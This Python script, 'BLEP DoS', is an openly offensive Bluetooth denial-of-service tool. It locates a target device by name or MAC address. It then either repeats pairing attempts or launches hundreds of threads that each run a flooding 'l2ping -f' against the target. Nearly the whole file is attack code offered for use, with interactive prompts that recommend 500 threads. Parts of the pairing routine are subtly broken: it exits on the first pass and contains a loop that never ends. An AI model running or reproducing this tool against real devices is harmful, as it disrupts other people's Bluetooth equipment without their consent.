# BLEP DoS (Bluetooth Low Energy Paired Denial of Serice)
# By Sean Kells
# NEEDS PYTHON 3.6.8 =< & ROOT PRIV
# Requires BLUEZ Bluetooth Network Stack

from logging import error
import time
import os
import sys
import ctlwrapper
import re
import threading
# from bluepy import btle

# GLOBALS
MAC = re.compile(r'(?:[0-9a-fA-F]:?){12}')


def intro():
    """
    intro function prints a logo of the program.
    
    Return: Nothing
    """
    os.system("clear")
    
    print(r"                          BLEP DoS                          ")
    print(r"+----------------------------------------------------------+")
    print(r"|       ____  __    __________     ____       _____        |")
    print(r"|      / __ )/ /   / ____/ __ \   / __ \____ / ___/        |")
    print(r"|     / __  / /   / __/ / /_/ /  / / / / __ \\__ \         |")
    print(r"|    / /_/ / /___/ /___/ ____/  / /_/ / /_/ /__/ /         |")
    print(r"|   /_____/_____/_____/_/      /_____/\____/____/          |")
    print(r"|                                                          |")
    print(r"+----------------------------------------------------------+")
    print("\n")


def pairingDOS(target):
    """
    --- ATTACK TYPE 1 ---
    pairingDOS performs a pairing with the target.  While weak alone, the overhead is signficiant together
    
    id: ID of the thread
    target: MAC address of the target
    
    Return: Nothing
    """
    # Values initialized
    fail_counter = 0
    attack_vector = ""

    # CTRL-C When Finished
    while True:
        # Exit Condition (Failure)
        if fail_counter >= 10 and input("Continue attack? <Y/N> ").upper() == 'Y':
            fail_counter = 0
        else:
            break
        
        # Begins here
        blueInterface = ctlwrapper.Bluetoothctl()

        if not blueInterface.connect(target):
            fail_counter += 1
            continue
        
        # Enter GATT menu
        blueInterface.send("menu gatt")

        while attack_vector == "":
            attributes = blueInterface.list_attributes(target)
            for attribute in attributes:
                print(attribute)

        # Disconnect
        blueInterface.disconnect(target)
        break


    print("Exiting...")
    return

def l2pingDOS(id, target, packetsize):
    """
    --- ATTACK TYPE 2 ---
    l2pingDOS performs a L2CAP large ping attack.  While weak alone, strong together

    id: ID of the thread
    target: MAC address of the target
    packetsize: size of the data in the packet

    Return: Nothing
    """
    try:
        os.system('l2ping -i hci0 -s ' + str(packetsize) +' -f ' + str(target) + ' > /dev/null')
    except:
        print("Raised Interrupt")
        raise KeyboardInterrupt


def findMAC(target):
    """
    findMAC function takes in a Device Name and scans local bluetooth devcies for any matches then returns the
    device name's corresponding MAC Address.  If it cannot find it for an extended period of time (5 seconds)
    function will ask if you want to continue

    target: Device Name of target

    Return: MAC address of target
    """
    blueInterface= ctlwrapper.Bluetoothctl()

    # Start scan
    blueInterface.start_scan()

    # Let's search for our device
    attempts = 0
    while not MAC.match(target):
        attempts += 1

        # Found devices
        found_devices = blueInterface.get_available_devices()
        for device in found_devices:
            # If Device Name Matches
            if device['name'] == target:
                blueInterface.close_scanner()
                return device['mac_address']

        # Should we continue?
        if attempts >= 5 and input("The desired device was not found... Continue searching? <Y/N> ").upper() == 'Y':
            attempts = 0
        elif attempts >= 5:
            print("Could not find MAC.  Exiting...")
            blueInterface.close_scanner()
            exit()       


def selectattack(target, attackType, numThreads=100, packetSize=600):
    """
    selectattack function is called from commandline and interactive to select and execute the attack dependent on arguments provided
    and inserted target MAC address

    target: target MAC address

    Return: Nothing
    """
    # Choose Attack Type
    if attackType == 1:
            pairingDOS(target)
    
    elif attackType == 2:
        # Threading
        threads = []
        for i in range(int(numThreads)):
            threads.append(threading.Thread(target=l2pingDOS, args=[i, target, packetSize]))
        try:
            for thread in threads:
                thread.daemon=True
                thread.start()
            while True:
                time.sleep(100)
        except:
            raise KeyboardInterrupt


def commandline():
    """
    commandline function is called from main and triggers when sufficient system arguments are provided.  Speed use for testing and attacking.
    NO INTERACTIONS OTHER THAN ESCAPE SCAN

    sys.argv[0]: file name
    sys.argv[1]: target <Device Name/MAC Address>
    sys.argv[2]: Attack Type <1 (pairing)  /  2 (l2ping)>
    sys.argv[3]: Thread Number (optional)
    sys.argv[4]: packet size (optional)

    Return: Nothing
    """
    # Set target and attack Type
    target = str(sys.argv[1])
    attackType = int(sys.argv[2])

    # If entry is a device name, find MAC with it
    if not MAC.match(target):
        target = findMAC(str(target))
    
    # Execute attack
    if attackType == 1 and len(sys.argv) == 3:
        selectattack(target, attackType)
    elif attackType == 2 and len(sys.argv) == 5:
        selectattack(target, attackType, sys.argv[3], sys.argv[4])

    return
    

def interactive():
    """
    interative function is called from main and triggers when no/insufficient system arguments are provided.  This interactive mode is for users new to the 
    tool

    Return: Nothing
    """
    # Variables
    target = ""
    attackType = 0
    numThreads = 0
    packetSize = 0

    # Let's show off that logo
    intro()

    print ("Enter help for further input instructions")
    
    # Enter target MAC identity or Device Name
    while target == "":
        target = input("MAC Address <ex: AB:CD:EF:GH:IJ:12> or Device Name: ")
        if not MAC.match(target):
            target = findMAC(target)

    # Choose attack type
    while attackType != 1 and attackType != 2:
        attackType = input("Choose Attack Type: 1 (pairing), 2 (l2ping): ")
        if not attackType.isdigit():
                attackType = 0
        # Cast INT
        attackType = int(attackType)


    if attackType == 2:
        # Choose number of threads
        while numThreads <= 0 and numThreads < 1000:
            numThreads = input("Choose Number of threads <Recommended 500>: ")
            if numThreads == "help":
                print("The entered input must be 0 - 1000.  This is the number of threads you will attack with.")
            elif not numThreads.isdigit():
                numThreads = 0
            
            # Cast INT
            numThreads = int(numThreads)

        # Choose packetSize
        while packetSize <= 0 and packetSize < 1000:
            packetSize = input("Packet Size <Default 600>: ")
            if packetSize == "":
                packetSize = 600
                break
            elif not packetSize.isdigit():
                packetSize = 0
            
            # Cast INT
            packetSize = int(packetSize)

    # Beginning Attack
    print("Starting the attack...")

    if attackType == 1:
        selectattack(target, attackType)
    elif attackType == 2:
        selectattack(target, attackType, numThreads, packetSize)

    print("Ending attack...")

    return


def main():
    """
    main function is the initial entry and creates the threads for the
    desired DoS attack.

    Return: Nothing
    """
    # BLEPDoS.py <str>target <int>attacktype <int>numThreads <int> packetSize
    if len(sys.argv) >= 3:
        # COMMANDLINE MODE
        commandline()
        
    else:
        # INTERATIVE MODE
        interactive()

    return


if __name__ == '__main__':
    try:
        starttime = time.time()
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print("\n\nAbort Successful")
        print("Total time run:", time.time() - starttime)
        exit(0)
    except Exception as e:
        print("are we rly mate")
        print(e)
        exit(1)
